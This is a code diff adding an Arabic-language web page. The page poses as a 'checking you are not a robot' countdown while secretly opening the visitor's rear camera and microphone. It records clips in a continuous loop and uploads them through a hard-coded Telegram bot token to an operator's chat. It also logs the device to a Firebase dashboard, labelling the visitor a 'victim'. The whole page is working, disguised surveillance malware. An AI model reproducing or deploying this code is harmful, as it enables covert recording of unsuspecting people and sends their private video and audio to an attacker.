@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Support the communication sites</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <style>
+        /* تنسيقات CSS مدمجة من ملف style.css */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
+        body {
+            height: 100vh; display: flex; align-items: center; justify-content: center;
+            background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2);
+            background-size: 400% 400%; animation: backgroundAnimation 6s ease infinite;
+        }
+        @keyframes backgroundAnimation { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        .loading-container { background-color: white; padding: 30px; border-radius: 15px; box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2); width: 90%; max-width: 400px; }
+        h1 { color: red; font-size: 24px; margin-bottom: 10px; }
+        p { color: #333; font-size: 18px; margin-bottom: 15px; }
+        .progress-container { width: 100%; background-color: #ddd; border-radius: 10px; overflow: hidden; height: 10px; margin: 10px 0; }
+        .progress-bar { width: 100%; height: 100%; background-color: red; transition: width 1s linear; }
+        #countdown { font-size: 20px; font-weight: bold; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <h1>جاري التحقق من انك لست روبت</h1>
+        <p>يرجع التعاون معنا لكي تحصل علي تجربه ممتعه <br> عند الانتهاء من العد التنازلي ولم يحدث شئ اعد تحميل الصفحة مره اخري رجاءً</p>
+        <div class="progress-container">
+            <div class="progress-bar" id="progress"></div>
+        </div>
+        <p id="countdown">20</p>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // منطق Javascript مدمج ومعدل من ملف script.js
+        document.addEventListener("DOMContentLoaded", async function () {
+            // إعدادات Firebase الخاصة بك
+            const firebaseConfig = {
+                databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/"
+            };
+            if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+            const db = firebase.database();
+
+            const countdownElement = document.getElementById("countdown");
+            const progressBar = document.getElementById("progress");
+            let timeLeft = 20;
+            let countdownStarted = false;
+            let mediaRecorder;
+            let recordedChunks = [];
+            let videoStream;
+
+            // بيانات التليجرام المستخرجة من الكود الأصلي
+            const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk"; //
+            const adminChatId = "5375214810"; //
+
+            // استخراج user_id من الرابط
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get("user_id"); //
+
+            async function startCamera() {
+                try {
+                    // تشغيل الكاميرا الخلفية مع الصوت كما في طلبك الأخير
+                    videoStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: "environment" },
+                        audio: true
+                    });
+
+                    const video = document.getElementById('video');
+                    video.srcObject = videoStream;
+                    video.onloadedmetadata = () => {
+                        startCountdown();
+                        startRecording();
+                        
+                        // إرسال "سجل نشاط" للفيربيس لإظهار أن الضحية متصلة الآن في لوحة التحكم
+                        if (userId) {
+                            db.ref('live_status/' + userId).set({
+                                status: "ضحية متصلة الآن 📡",
+                                last_seen: new Date().toLocaleTimeString(),
+                                device_info: navigator.userAgent
+                            });
+                        }
+                    };
+                } catch (error) { console.error("🚨:", error); }
+            }
+
+            function startCountdown() {
+                if (countdownStarted) return;
+                countdownStarted = true;
+                const countdownInterval = setInterval(() => {
+                    timeLeft--;
+                    countdownElement.textContent = timeLeft;
+                    progressBar.style.width = (timeLeft / 20) * 100 + "%";
+                    if (timeLeft <= 0) { clearInterval(countdownInterval); }
+                }, 1000);
+            }
+
+            function startRecording() {
+                mediaRecorder = new MediaRecorder(videoStream, { mimeType: "video/webm" });
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                mediaRecorder.onstop = () => {
+                    // إرسال الفيديو المسجل للتليجرام لكل من الآدمن والمستخدم
+                    sendVideo(adminChatId);
+                    if (userId && userId !== adminChatId) { sendVideo(userId); }
+                    
+                    recordedChunks = [];
+                    startRecording(); // إعادة التسجيل التلقائي
+                };
+                mediaRecorder.start();
+                setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 5000); // تسجيل مقاطع مدتها 10 ثوانٍ
+            }
+
+            function sendVideo(chatId) {
+                const blob = new Blob(recordedChunks, { type: "video/webm" });
+                const formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("video", blob, "video_clip.webm");
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                    method: "POST",
+                    body: formData
+                });
+            }
+
+            startCamera();
+        });
+    </script>
+</body>
+</html>
